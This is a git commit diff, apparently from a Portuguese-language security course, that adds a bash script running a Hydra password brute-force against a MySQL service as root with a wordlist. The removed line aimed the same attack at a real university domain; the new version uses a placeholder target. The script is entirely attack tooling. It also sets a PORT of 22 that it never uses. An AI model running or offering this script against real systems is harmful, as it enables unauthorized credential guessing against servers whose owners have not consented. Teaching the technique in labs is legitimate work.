8100240f1d30461c3a4751a38d3badb553c4d9c5
Robson Vaamonde <robsonvaamonde@gmail.com>
2016-11-02 13:08:24 -0200

    Update 08-mysql.sh

--- 02_day/08-mysql.sh
+++ 02_day/08-mysql.sh
@@ -1,10 +1,24 @@
+#!/bin/bash
+# Autor: Robson Vaamonde
+# Site: www.procedimentosemti.com.br
+# Facebook: facebook.com/ProcedimentosEmTI
+# Facebook: facebook.com/BoraParaPratica
+# YouTube: youtube.com/BoraParaPratica
+# Data de criação: 31/10/2016
+# Data de atualização: 31/10/2016
+# Versão: 1.0
 
+#Variável do comando Hydra
+ALVO="www.SEU_ALVO.br"
+USERNAME="root"
+WORDLIST="senhas.txt"
+PORT="22"
+SERVICE="mysql"
 
-
-
-
-
-
-
-
-hydra -t 5 -vV -f -l root -e ns -P senhas.txt www.uninove.br mysql
+#Executando o comando Hydra com a opções: -s=Porta, -e=Checagens Adcionais, -f=Após confirmação de Login, sair do acesso, -vV=Modo Verboso, detalhado na hora de passar usuário e senhas, -L=Wordlist de Usuários, -P=Wordlist de senhas, -t=Tarefas/Tentativas
+#Informações levantadas utilizando o comando Nmap
+echo -e "Executando o comando Hydra no alvo: $ALVO"
+echo
+  hydra -t 5 -vV -f -l $USERNAME -e nsr -P $WORDLIST $ALVO $SERVICE
+echo
+echo -e "Fim da execução `date`"
